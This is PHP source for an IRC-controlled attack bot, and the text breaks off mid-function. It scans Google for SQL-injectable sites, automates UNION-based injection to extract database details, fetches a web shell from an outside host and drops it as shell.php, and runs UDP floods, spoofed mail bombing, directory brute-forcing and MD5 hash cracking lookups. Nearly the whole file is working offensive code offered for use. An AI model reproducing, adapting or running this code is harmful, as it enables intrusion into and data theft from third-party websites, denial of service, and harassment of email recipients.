<?php
set_time_limit( 0 );
error_reporting( E_ALL ^ E_NOTICE );/**
 * @author BlackDream & OBLiQUE
 * @copyright 2009 p0wnbox.com
 */###############################################################
#                          p0wnbox.com                        #
#         SQLi Google Scanner & MySQLi Dumper PHP IRC BOT     #
###############################################################
#                            #######                          #
#                                                             #
#                            v1.0                             #
#                         p0wnbox.com                         #
#                    By BlackDream & OBLiQUE                  #
###############################################################if ( !$argv[0] )
{
    cmd( 'php ' . __file__ . '& > /dev/null' );
    die();
}//########################INFORMATION##################################//+++++++EDIT THIS$server = "irc.freenode.net";
$port = 6667;
$me = "Name-of-the-bot-just-make-it-up";
$channel = "#channel";
$identify = "id";
$users = array( "user1", "user2", "user3"); //Admins
$max_results = 500; // maximum Google results //
$threads = 10; //URLS TO test IN the same time!!$wordlists = array("dir_brute" => './dir_wordlist.txt',
                   "mysql_tables" => './dic_tables.txt'
                  );$search = array( "Microsoft JET Database Engine error", "Microsoft VBScript runtime error", "ODBC Drivers error", "Syntax Error", "You Have An error", "mysql error", "SQL ERROR",
    "<b>Warning</b>:  mysql", "mysql_fetch_array", "mysql_numrows(", "mysql_num_rows(", "mysql_result", "extract(", "main(" );//-------EDIT THIS$created_files = array(); // Files Created by The Script.$socket = fsockopen( $server, $port, $e, $o, 30 );
if ( !$socket )
{
    echo "\n[-]Unable To connect...\n\n\n";
    exit;
}fwrite( $socket, "USER php 127.0.0.1 PHP :PHP Bot\nNICK " . $me . "\nJOIN :" . $channel . "\n" );function encodeDork( $s )
{
    $tmp = "";
    for ( $i = 0; $i < strlen($s); $i++ )
    {
        $tmp .= "&#" . hexdec( bin2hex($s[$i]) ) . ";";
    }
    return urlencode( $tmp );
}function page_get_content( $url )
{
    $ch = curl_init( $url );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch, CURLOPT_HEADER, 0 );
    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 2 );
    curl_setopt( $ch, CURLOPT_TIMEOUT, 4 );
    $ret = curl_exec( $ch );
    curl_close( $ch );
    return $ret;
}function cmd( $shell )
{
    $safe = ini_get( "safe_mode" );
    if ( $safe )
    {
        die( "safe mode is on execution aborted" );
    } elseif ( function_exists("passthru") )
    {
        $cmd = "passthru";
    } elseif ( function_exists("shell_exec") )
    {
        $cmd = "shell_exec";
    } elseif ( function_exists("system") )
    {
        $cmd = "system";
    } elseif ( function_exists("exec") )
    {
        $cmd = "exec";
    } elseif ( function_exists("popen") )
    {
        $cmd = "popen";
    } elseif ( function_exists("proc_open") )
    {
        $cmd = "proc_open";
    } else
    {
        die( 'all execution function have been disabled exiting....' );
    }
    return $cmd( $shell );
}function hex2bin( $h )
{
    if ( !is_string($h) )
        return null;
    $r = '';
    for ( $a = 0; $a < strlen($h); $a += 2 )
    {
        $r .= chr( hexdec($h{$a} . $h{($a + 1)}) );
    }
    return $r;
}function prepare_dump( $injection, $extract )
{    global $sites;    $website = trim( str_replace('vuln', "concat(0x735b5b,$extract,0x5d5d65)", $sites[0]) );
    $comment = substr( $website, -2 );    if ( ($comment == '--') || ($comment == '/*') )
    {
        $website = trim( str_replace($comment, $injection . $comment, $website) );
    } else
    {
        $website = trim( $website . $injection );
    }
    return $website;
}function is_vulnerable( $source, $error )
{
    if ( stristr($source, $error) != false )
    {
        return true;
    } else
    {
        return false;
    }
}function get_data_from_array( $array, $count )
{    for ( $i = 0; $i < $count; $i++ )
    {
        if ( !isset($array[$i]) )
            break;
        $data .= ' ' . trim( $array[$i] ) . ' ,';
    }    $data = substr( $data, 0, -2 );
    return $data;
}function fwrite_data_with_count( $array, $which, $count )
{
    global $socket, $channel, $nick;
    do
    {
        $tmp = count( $array );        $data = get_data_from_array( $array, $count );        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] $which: " . chr(3) . "7 $data\r\n" );        for ( $i = 0; $i < $count; $i++ )
        {
            unset( $array[$i] );
        }
        sort( $array );
        sleep( 3 );
    } while ( count($array) > 0 );
}function ExecHandle( &$curlHandle )
{
    $flag = null;
    do
    {
        curl_multi_exec( $curlHandle, $flag );
    } while ( $flag > 0 );
}function usleepWindows( $usec )
{
    $start = gettimeofday();    do
    {
        $stop = gettimeofday();
        $timePassed = 1000000 * ( $stop['sec'] - $start['sec'] ) + $stop['usec'] - $start['usec'];
    } while ( $timePassed < $usec );
} 
while ( !feof($socket) )
{
    $read = trim(fgets($socket,512));
    echo $read . "\n";
    $cmd = explode( " ", $read );
    $nick = explode( ':', $cmd[0] );
    $nick = explode( '!', $nick[1] );
    $nick = strtolower( $nick[0] );    switch ( $cmd[1] )
    {
        case "KICK":
            if ( $cmd[3] == $me )
            {
                fwrite( $socket, "\nJOIN :" . $channel . "\n" );
            }
        break;
        case "PRIVMSG":
            if ( in_array($nick, $users) )
            {
                switch ( strtolower( str_replace( array(chr(10), chr(13)), '', $cmd[3] ) ) )
                {
                    case ":!help":
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] My Commands Are: \r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !udpflood host packets packetsize delay\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !join #channel\r\n" );
                        sleep(3);
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !dirbrute http://thesite.com/ connections (Find Folders In A WebSite)\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !webshell (Drop Shell)\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !mailbomber to from subject message count\r\n" );
                        sleep(3);
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !join #channel\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !part #channel\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !md5search md5\r\n" );
                        sleep(3);
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !sql dork\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !col site (Count Columns)\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !save site (With Vuln Word,SQLi Vulnerable Site)\r\n");
                        sleep(3);
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !get_info (Saved Site)\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !get_dbs (Saved Site)\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !get_tables database (Saved Site)\r\n" );
                        sleep(3);
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !get_cols database table (Saved Site)\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !brute (Saved Site) (Find Tables For MySQL V4)\r\n" );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] !exit\r\n" );
                    break;
                    case ":!join":
                        fwrite( $socket, "\nJOIN :" . $cmd[4] . "\n" );
                    break;
                    case ":!save":
                        $site = $cmd[4];
                        if ( !isset($site) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Argument Missing!\r\n" );
                        } elseif ( !strstr($site, 'vuln') )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Vuln Word Not Found... Vuln = Vulnerable Column!\r\n" );
                        } else
                        {
                         if(count( $created_files ) > 0) {
                            for ( $i = 0; $i < count( $created_files ); $i++ )
                            {
                                unlink( $created_files[$i] );
                            }
                            $created_files = array();
                         }
                            $sites = array();
                            array_push( $sites, $site );
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Saved! Now If You Want Type !get_info\r\n" );
                        }
                    break;
                    case ":!exit":
                        exit( fwrite($socket, "\nQUIT :Connection Lost\n") );
                    break;
                    case ":!webshell":
                        $source = file_get_contents("http://testsite.li/components/shell.txt");
                        if(!empty($source)) {
                           file_put_contents("./shell.php",$source);
                           fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Shell Dropped With Success!\r\n" );
                        } else
                           fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Remote Shell Not Found!\r\n" );
                    break;
                    case ":!dirbrute":
                        $site = $cmd[4];
                        $connections = $cmd[5];
                        if ( ($site == null) || (!is_numeric($connections)) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Argument Missing Or Wrong Info Provided!\r\n" );
                            break;
                        } else
                            if ( !file_exists($wordlists['dir_brute']) )
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] WordList ".$wordlists['dir_brute']." Not Found.\r\n" );
                                break;
                            }                        preg_match( "@^(http://.*?)(/|$)@", $site, $matches ); //Make a preg_match to take the url without query strings                        $host = $matches[1];
                        $Dictionary = file( $wordlists['dir_brute'] ); //Our wordlist for folders
                        $count = count( $Dictionary );
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Dir Bruting Started...! Site:" . chr(3) . "7 " . $host . " . " . chr(3) . "12Connections:" . chr(3) . "7 " . $connections . " " . chr(3) . "12Folders to check:" . chr(3) . "7 " . $count . "\r\n" );
                        for ( $i = 0; $i < $count; $i++ )
                            $Dictionary[$i] = str_replace( "\r\n", "", $host . '/' . $Dictionary[$i] . '/' ); //Prepare all the sites like http://thesite.com/folder 
                        $curlHandle = curl_multi_init();
                        $o = $connections;
                        do {
                            $cURL = array(); //Array to put there all the sites and initialize them with curl
                            $curl_info = array(); //The Source/header will be saved here                            $tmp = count( $Dictionary );                            for ( $i = 0; $i < $connections && $i < $tmp; $i++ )
                            {
                                $cURL[$i] = curl_init( $Dictionary[$i] );
                                curl_setopt( $cURL[$i], CURLOPT_HEADER, true ); //Inlucde header
                                curl_setopt( $cURL[$i], CURLOPT_NOBODY, true ); //No content
                                curl_setopt( $cURL[$i], CURLOPT_RETURNTRANSFER, true ); //Return Transfer..
                                curl_multi_add_handle( $curlHandle, $cURL[$i] );
                            }                            ExecHandle( $curlHandle ); //curl_exec for multi                            for ( $i = 0; $i < $connections && $i < $tmp; $i++ )
                            {
                                $curl_info[$i] = curl_multi_getcontent( $cURL[$i] ); //Get all the headers and save them to an array
                            }                            for ( $i = 0; $i < $connections && $i < $tmp; $i++ )
                            {
                                if ( stripos($curl_info[$i], '200 OK') )
                                    fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Response 200 -> " . $Dictionary[$i] . "\r\n" );
                            }
                            for ( $i = 0; $i < $connections && $i < $tmp; $i++ )
                            {
                                curl_multi_remove_handle( $curlHandle, $cURL[$i] ); //Remove the handle from these urls
                                unset( $Dictionary[$i] ); //Unset this var. It is neccessary,otherwise the script will continue to test the same url...
                            }
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Scanned $o...\r\n" );
                            $o += $connections;
                            sort( $Dictionary ); //Sort our array. After Unset the sort is neccessary, otherwise some cases in the array will be null
                        } while ( count($Dictionary) > 0 ); //Make a repeat while the cases in the dictionary are > 0
                        curl_multi_close( $curlHandle ); //Close the init                        unset( $curl_info, $cURL, $Dictionary );                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );                    break;
                    case ":!part":
                        fwrite( $socket, "\nPART :" . $cmd[4] . "\n" );
                    break;
                    case ":!udpflood":
                        if ( count($cmd) > 7 )
                        {
                            $host = $cmd[4];
                            $packets = $cmd[5];
                            $packetsize = $cmd[6];
                            $delay = $cmd[7];
                            
                            $fp = fsockopen( "udp://" . $host, mt_rand(1, 65535), $errno, $errstr, 5 );  //Make A connection with remote ip IN UDP protocol
                            if ( !$fp )
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Connection Aborted!\r\n" );
                                break;
                            } else
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Sending" . chr(3) . "7 " . $packets . " " . chr(3) . "12packets to" . chr(3) . "7 " . $host . " " . chr(3) . "12with" . chr(3) . "7 " . $delay . " " . chr(3) . "12ms delay. PacketSize:" . chr(3) . "7 " . $packetsize . "\r\n" );
                            }
                            $packet = "";                            for ( $i = 0; $i < $packetsize; $i++ )
                                $packet .= chr( mt_rand(1, 256) );  //Prepare the Size Of Packets
                                
                            for ( $i = 0; $i < $packets; $i++ )
                            {
                                fwrite( $fp, $packet );      //Sends the packets to the remote ip
                                usleepWindows( $delay );    //usleep function but for windows. Usleep dont work on windows
                            }
                            fclose( $fp );
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done!\r\n" );                        } else
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Argument Missing!\r\n" );
                        }
                    break;
                    case ":!mailbomber":
                        if ( count($cmd) == 9 )
                        {
                            $count = $cmd[8];
                            $victim = $cmd[4];
                            $subject = $cmd[6];
                            $message = $cmd[7];
                            $p = 0;
                            $l = 0;
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Sending" . chr(3) . "7 " . $count . " " . chr(3) . "12E-Mails to" . chr(3) . "7 " . $victim . "\r\n" );                            $headers = "From: $cmd[5]" . "\r\n" . "Reply-To: $victim" . "\r\n" . "X-Mailer: PHP/" . phpversion();
                            for ( $i = 0; $i < $count; $i++ )
                            {
                                if ( mail($victim, $subject, $message, $headers) ) //Sending Mails...
                                    $p++;
                                else
                                    $l++;
                            }
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+]" . chr(3) . "7 " . $p . " " . chr(3) . "12Emails Sended." . chr(3) . "7 " . $l . " " . chr(3) . "12Emails lost their way\r\n" );
                        } else
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Wrong Parametres\r\n" );
                        }
                    break;
                    case ":!md5search":
                        $md5 = strtolower( $cmd[4] );                        if ( ereg("([0-9a-f]{32})", $md5) )   //We need valid md5...
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Searching For Pass... Please Wait!\r\n" );                            //Sites to search in
                            $urls = array( 0 => ("http://md5.rednoize.com/?p&s=md5&q=" . $md5),
                                           1 => ("http://gdataonline.com/qkhash.php?mode=txt&hash=" . $md5),
                                           2 => ("http://milw0rm.com/cracker/search.php"),
                                           3 => ("http://md5decryption.com/"),
                                           4 => ("http://ice.breaker.free.fr/md5.php?hachage=" . $md5),
                                           5 => ("http://passcracking.com/"),
                                           6 => ("http://md5.hashcracking.com/search.php?md5=" .$md5),
                                           7 => ("http://www.hashchecker.com/index.php?_sls=search_hash"),
                                           8 => ("http://md5crack.it-helpnet.de/index.php?op=search"),
                                           9 => ("http://blacklight.gotdns.org/cracker/crack.php"),
                                           10 => ("http://md5.ip-domain.com.cn/"),
                                           11 => ("http://www.bigtrapeze.com/md5/"),
                                           12 => ("http://opencrack.hashkiller.com/")
                                          );
                            //Query Strings, if any
                            $params = array( 0 => (null),
                                             1 => (null),
                                             2 => ("hash=" . $md5 . "&submit=Submit"),
                                             3 => ("hash=" . $md5 . "&submit=Decrypt It!"),
                                             4 => (null),
                                             5 => ("datafromuser=" . $md5 . "&submit=DoIT"),
                                             6 => (null),
                                             7 => ("search_field=" . $md5 . "&Submit=search"),
                                             8 => ("md5=" . $md5 . "&submit=Search now"),
                                             9 => ("hash=" . $md5 . "&algos=MD5&crack=Crack"),
                                             10 => ("text=" . $md5 . "&submit=submit"),
                                             11 => ("query=" . $md5 . "&submit= Crack "),
                                             12 => ("oc_check_md5=" . $md5 ."&oc_submit=Search MD5")
                                            );
                            //Search For Pass in the source with patterns
                            $patterns = array( 0 => (null),
                                               1 => ("/<\/td><td width=\"35%\"><b>(.*)<\/b><\/td><\/tr>/"),
                                               2 => ("/<\/TD><TD align=\"middle\" nowrap=\"nowrap\" width=90>(.*)<\/TD><TD align=\"middle\" nowrap=\"nowrap\" width=90>cracked<\/TD><\/TR>/"),
                                               3 => ("/<h2>Results<\/h2><b>Md5 Hash:<\/b> " . $md5 . "<br\/><b class='red'>Normal Text: <\/b>(.*)<br\/>/"),
                                               4 => ("/: <b><br \/><br \/> - (.*)<\/b>/"),
                                               5 => ("/<\/td><td>md5 Database<\/td><td>" . $md5 . "<\/td><td bgcolor=#FF0000>(.*)<\/td><td>/"),
                                               6 => ("/Cleartext of " . $md5 . " is (.*)/"),
                                               7 => ("/<td><li>Your md5 hash is :<br><li>" . $md5 . " is <b>(.*)<\/b> used charl/"),
                                               8 => ("/<\/td><td>" . $md5 . "<\/td><td>(.*)<\/td>/"),
                                               9 => ("/" . $md5 . " -> <b>(.*)<\/b><br><br>/"),
                                               10 => ("/<strong>result:<\/strong><font color=\"red\">(.*)<\/font>&nbsp;/"),
                                               11 => ("/The hash <strong>" . $md5 . "<\/strong> has been deciphered to: <strong>(.*)<\/strong>/"),
                                               12 => ("/<\/div><div class=\"result\">" . $md5 . ":(.*)<br\/>/")
                                               );
                            for ( $i = 0; $i < count($urls); $i++ )
                            {
                                if ( (count($urls) !== count($params)) || (count($urls) !== count($patterns)) || (count($params) !== count($patterns)) )
                                {
                                    fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] ERROR Found!\r\n" );
                                    break;
                                }                                $url = $urls[$i];
                                $param = $params[$i];
                                $pattern = $patterns[$i];                                $message = ereg_replace( "(http|https)://", null, $url ); //Get the url without protocols
                                $message = ereg_replace( "/(.*)", null, $message );   //Get the url now without /...                                $ch = curl_init();
                                curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, "4" );
                                if ( !empty($param) )
                                {
                                    curl_setopt( $ch, CURLOPT_POST, 1 );
                                    curl_setopt( $ch, CURLOPT_POSTFIELDS, $param );
                                }
                                curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
                                curl_setopt( $ch, CURLOPT_URL, $url );
                                curl_setopt( $ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)" );
                                curl_setopt( $ch, CURLOPT_TIMEOUT, "4" );
                                $result = @curl_exec( $ch ); //Get Source
                                curl_close( $ch );
                                if ( !empty($result) )
                                {
                                    if ( empty($pattern) )
                                    {
                                        $final = $result;
                                    } else
                                    {
                                        preg_match( $pattern, $result, $final );   //Do a preg_match to get the pass
                                        $final = $final[1];
                                    }
                                    if ( !empty($final) )
                                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] [" . chr(3) . "3" . $message . "" . chr(3) . "12] ->" . chr(3) . "7 " . $final . "\2\r\n" );
                                    else
                                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] [" . chr(3) . "4" . $message . "" . chr(3) . "12] -> \2Pass Not Found\2\r\n" );
                                }
                            }
                        } else
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Please Insert A Valid MD5 Hash!\r\n" );
                        }
                    break;
                    case ":!sql":
                        if ( !isset($cmd[4]) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Enter Dork!\r\n" );
                        } else
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] SQL Vulnerabilty Scan Started ...\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Dork : $cmd[4] \r\n" );                            $vuln_array = array();
                            $source = page_get_content( "http://www.google.com/search?q=" . encodeDork($cmd[4]) . "&start=0&num=1" );                            if ( stristr($source, '302 Moved') != false )
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Banned From Google!! \r\n" );
                                break;
                            }                            preg_match_all( "/of( about)* <b>([\d,]+)<\/b>/", $source, $max );  //Max Goodle URLs
                            $max = str_replace( ",", "", $max[2][0] );                            $max = $max > $max_results ? $max_results : $max;
                            $i = 0;
                            $num = $max < 10 ? $max : 10;                            while ( $i < $max )
                            {                                $source = page_get_content( "http://www.google.com/search?q=" . encodeDork($cmd[4]) . "&start=" . $i . "&num=" . $num );                                preg_match_all( "/<h3 class=r><a href=\"(.*?)\"/", $source, $links ); //All links here
                                if ( @$links[1] )
                                {
                                    foreach ( $links[1] as $l )   //Get One-one:PPP url
                                    {                                        if ( strpos($l, '=') != false ) //If = is in url then continue else do nothing
                                        {
                                            $url = explode( '=', $l );   //Explode our url with =
                                            $url = $url[0] . "='";      //Final url something like http://thesite.com/index.php?id='
                                            if ( !in_array($url, $vuln_array) )  //If url is not in the array then...
                                            {
                                                array_push( $vuln_array, $url ); //...added it!!
                                            }
                                        }
                                    }
                                }
                                $i += $num;
                                $num = $max - $i < 10 ? $max - $i : 10;
                            }                            $vuln_array = array_unique( $vuln_array ); //Remove Dumplicate Entries from the array
                            sort( $vuln_array );  //Sort Our Array                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Got " . count($vuln_array) . " Valid URLs! Injection Started...\r\n" );                            $p = 0;
                            $o = $threads;                            $curlHandle = curl_multi_init(); //Initialize cURL Multi Threading                            do
                            {
                                $cURL = array();
                                $source = array();
                                $tmp = count( $vuln_array );                                for ( $i = 0; $i < $threads && $i < $tmp; $i++ )
                                {
                                    //Prepare The Urls Specified in $threads
                                    $cURL[$i] = curl_init( $vuln_array[$i] );
                                    curl_setopt( $cURL[$i], CURLOPT_URL, $vuln_array[$i] );
                                    curl_setopt( $cURL[$i], CURLOPT_HEADER, 0 );
                                    curl_setopt( $cURL[$i], CURLOPT_RETURNTRANSFER, true );
                                    curl_setopt( $cURL[$i], CURLOPT_CONNECTTIMEOUT, 2 );
                                    curl_setopt( $cURL[$i], CURLOPT_TIMEOUT, 4 );
                                    curl_multi_add_handle( $curlHandle, $cURL[$i] );
                                }                                ExecHandle( $curlHandle );                                for ( $i = 0; $i < $threads && $i < $tmp; $i++ )
                                    $source[$i] = curl_multi_getcontent( $cURL[$i] );    //Get Content from the urls depending on $threads using threads 
                                for ( $i = 0; $i < $threads && $i < $tmp; $i++ )
                                {
                                    foreach ( $search as $error )
                                    {                                        if ( is_vulnerable($source[$i], $error) ) //If Is SQLi Vulnerable then print it in the chan
                                        {
                                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Possible Bug Found: $vuln_array[$i]\n" );
                                            $p++;
                                            sleep( 2 ); //Sleep for 2 seconds... Because the bot may be got timeout with reason excess flood.
                                            break;
                                        }
                                    }
                                } 
                                for ( $i = 0; $i < $threads && $i < $tmp; $i++ )
                                {
                                    curl_multi_remove_handle( $curlHandle, $cURL[$i] );  //Remove the urls from our cURL-Handle
                                    unset( $vuln_array[$i] ); //Unset the specified urls from our array. We dont need to test them again
                                }
                                sort( $vuln_array ); //Sort Again our array                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Scanned $o...\r\n" );
                                $o += $threads;                            } while ( count($vuln_array) > 0 );
                            curl_multi_close( $curlHandle );   //Close the curl-init
                            unset( $vuln_array, $source, $cURL );                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done. $p Bugs Found.\r\n" );
                        }
                    break;
                    case ":!col":
                        if ( !isset($cmd[4]) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Enter Site! Eg http://thesite.com/index.php?id=35\r\n" );
                            break;
                        }
                        fwrite( $socket, "\nNOTICE $nick :" . chr(3) . "4$nick " . chr(3) . "12[+] Please Not That This Function May Not Work Properly...\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Scan Started...\r\n" );                        $comment = $cmd[5];
                        
                        $comment_array = array( null, "--", "/*" );                        if ( !in_array($comment, $comment_array) )
                        {
                            $comment = '--';
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] You Enter No Valid Comment! Using Default Comment --\r\n" );
                        }
                        $injection = array( '/**/AND/**/1=0', '/**/union/**/all/**/select/**/' );
                        $word = "s[[";
                        $i = 1;
                        $website = $cmd[4];
                        
                        $source = page_get_content( $website . "'" );
                        
                        foreach ( $search as $error )
                        {
                            if ( is_vulnerable($source, $error) )
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] WebSite Is Vulnerable! Column Count Finding Started!...\r\n" );
                                $vulnerable = 1;
                                break;
                            }
                        }                        if ( $vulnerable != '1' )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] WebSite Is Not Vulnerable! Exiting...\r\n" );
                            break;
                        }                        while ( 1 )
                        {
                            if ( $i >= 70 )
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Unable To Get The Columns! Exiting...\r\n" );
                                $vulnerable = 2;
                                break;
                            }
                            
                            $num .= ",0x" . bin2hex( $word . $i . "]]e" );
                            $t = str_replace( "select/**/,", "select/**/", $injection[1] . $num );
                            $s = $injection[0] . $t . $comment;
                            $source = page_get_content( $website . $s );
                            
                            $vuln = '';
                            
                            if ( preg_match('/s\[\[(.*?)\]\]e/', $source, $data) )
                            {
                                for ( $o = 1; $o <= $i; $o++ )
                                    $vuln .= "," . $o;                                $columns = str_replace( "select/**/,", "select/**/", $injection[1] . $vuln );
                                $last = $website . $injection[0] . $columns . $comment;
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Website has" . chr(3) . "7 " . $i . " " . chr(3) . "12Columns! Site:" . chr(3) . "7 " . $last . "\r\n" );
                                break;
                            }
                            $i++;
                        }
                        if ( $vulnerable == '2' )
                        {
                            break;
                        }                        $vuln_column = $data[1][0];
                        $last_and_last = preg_replace( "/$vuln_column/", 'vuln', $columns, 1 );
                        $last = $website . $injection[0] . $last_and_last . $comment;
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Vulnerable Column:" . chr(3) . "7 " . $vuln_column . " ". chr(3) . "12! Now Type !save" . chr(3) . "7 " . $last . "\r\n" );
                        unset( $comment, $comment_array, $last, $vuln_column, $data, $last_and_last, $website, $source, $vuln, $num, $t, $s, $source  );
                    break;
                    case ":!get_info":
                        if ( !isset($sites[0]) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Type !saved to save your link first and then type !get_info ...\r\n" );
                            break;
                        }                        $website = str_replace( 'vuln', 'concat(0x735b5b,unhex(hex(@@version)),0x5d5d65,0x735b5b,unhex(hex(user())),0x5d5d65,0x735b5b,unhex(hex(database())),0x5d5d65)', $sites[0] );
                        $source = page_get_content( $website );
                        if ( preg_match_all('/s\[\[(.*?)\]\]e/', $source, $data) )
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] MySQL Version:" . chr(3) . "7 " . $data[1][0] . " " . chr(3) . "12Current User:" . chr(3) . "7 " . $data[1][1] . " " . chr(3) . "12Current Database:" . chr(3) . "7 " . $data[1][2] . "\r\n" );
                        } else
                        {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Unable To Get The Data! Proccessing To Step 2... \r\n" );
                            $website = str_replace( 'vuln', 'concat(0x735b5b,@@version,0x5d5d65,0x735b5b,user(),0x5d5d65,0x735b5b,database(),0x5d5d65)', $sites[0] );
                            $source = page_get_content( $website );
                            
                            if ( preg_match_all('/s\[\[(.*?)\]\]e/', $source, $data) )
                            {
                            fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] MySQL Version:" . chr(3) . "7 " . $data[1][0] . " " . chr(3) . "12Current User:" . chr(3) . "7 " . $data[1][1] . " " . chr(3) . "12Current Database:" . chr(3) . "7 " . $data[1][2] . "\r\n" );
                            } else
                            {
                                fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[-] Unable To Get The Data! Exiting... \r\n" );
                            }
                        }
                        fwrite( $socket, "\nPRIVMSG $channel :" . chr(3) . "4$nick " . chr(3) . "12[+] Done! \r\n" );                        unset( $source, $website, $data );
                    break;
                    case ":!brute":
                        $brute_what = $cmd[4];
                        if ( !isset($sites[0]) )
                        {
